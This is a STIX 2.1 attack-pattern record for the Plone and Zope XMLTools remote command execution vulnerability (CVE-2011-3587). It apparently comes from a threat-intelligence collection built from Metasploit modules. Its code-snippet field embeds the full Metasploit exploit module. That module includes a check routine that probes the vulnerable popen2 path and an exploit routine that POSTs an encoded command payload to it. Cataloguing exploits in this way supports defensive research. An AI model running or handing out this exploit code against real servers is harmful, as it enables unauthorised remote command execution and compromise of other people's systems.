{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8effc094-b776-4730-8791-f468899b91f7",
    "created": "2024-08-14T17:10:43.728481Z",
    "modified": "2024-08-14T17:10:43.728484Z",
    "name": "Plone and Zope XMLTools Remote Command Execution",
    "description": " Unspecified vulnerability in Zope 2.12.x and 2.13.x, as used in Plone 4.0.x through 4.0.9, 4.1, and 4.2 through 4.2a2, allows remote attackers to execute arbitrary commands via vectors related to the p_ class in OFS/misc_.py and the use of Python modules.   'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/plone_popen2.rb",
            "external_id": "plone_popen2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3587"
        },
        {
            "source_name": "reference",
            "url": "http://plone.org/products/plone/security/advisories/20110928"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Plone and Zope XMLTools Remote Command Execution',\n      'Description'    => %q{\n        Unspecified vulnerability in Zope 2.12.x and 2.13.x, as used in Plone 4.0.x\n        through 4.0.9, 4.1, and 4.2 through 4.2a2, allows remote attackers to execute\n        arbitrary commands via vectors related to the p_ class in OFS/misc_.py and\n        the use of Python modules.\n\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',              # Plone Security Team, original vulnerability discovery\n          'Nick Miles',           # Original exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-3587'],\n          ['OSVDB', '76105'],\n          ['EDB', '18262'],\n          ['URL', 'http://plone.org/products/plone/security/advisories/20110928']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n      {\n        'Compat'     =>\n        {\n          'PayloadType'  => 'cmd',\n          'RequiredCmd'  => 'generic telnet perl ruby python',\n        }\n      },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [['Automatic',{}]],\n      'DisclosureDate' => '2011-10-04',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('URI',[true, \"The path to the Plone installation\", \"/\"]),\n      ])\n    register_autofilter_ports([ 8080 ])\n  end\n\n  def check\n    uri = normalize_uri(datastore['URI'], 'p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2')\n\n    res = send_request_raw(\n      {\n        'uri'       => uri\n      }, 25)\n    if (res.headers['Bobo-Exception-Type'].to_s =~ /zExceptions.BadRequest/)\n      return Exploit::CheckCode::Appears\n    end\n    # patched == zExceptions.NotFound\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    uri = normalize_uri(datastore['URI'], 'p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2')\n\n    send_request_cgi(\n      {\n        'method'    => 'POST',\n        'uri'       => uri,\n        'vars_post' =>\n          {\n            'cmd' => payload.encoded,\n          }\n      }, 0.5) # short timeout, we don't care about the response\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-04",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}